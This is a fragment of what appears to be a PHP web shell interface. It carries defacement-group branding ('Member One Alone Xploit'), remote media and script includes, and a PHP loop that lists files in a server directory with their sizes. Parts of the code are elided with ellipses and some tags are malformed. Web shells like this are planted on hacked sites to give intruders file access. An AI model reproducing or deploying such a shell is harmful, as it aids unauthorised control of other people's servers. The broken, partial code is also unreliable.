...
<html lang="en-US">
		 ...
		 <head>
			 ...
			 <meta name="viewport" content="width=device-width">
				...
				<title>Shel hasil nyampah</title>
		 ...
		 <body>
		  <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
				<center>
				<a href="<?php $url=basename($_SERVER['PHP_SELF']);echo $url;?>"><b><h1><font face="courier new" color="white">Welcome To Tn Loading </font></h1></b><img width="300" height="300" src="https://g.top4top.io/p_1928x5ytp0.jpg"><br><br><audio src="https://h.top4top.io/m_1928k8q821.mp3" type="audio/mpeg" controls="controls" autoplays="autoplays"></a>
				</center>
			 <center><br><marquee><b><h4><font face="courier new" color="white">Member One Alone Xploit</font></h4></b></marquee></center>
			 <br>
...
<?php
 foreach($scandir as $file){if(!is_file("$path/$file"))continue;$size=filesize("$path/$file")/1024;$size=round($size,3);if($size>=1024){$size=round($size/1024,2).' MB';}else{$size=$size.' KB';}echo "					<tr>
			...
			<center>
			<h4><font face="courier new" color Support Newbie :<a href=""><h4><font color="yellow" face="courier new">©2021</font></h4></a></div>
		</center>
		</body>
</html>
<?php
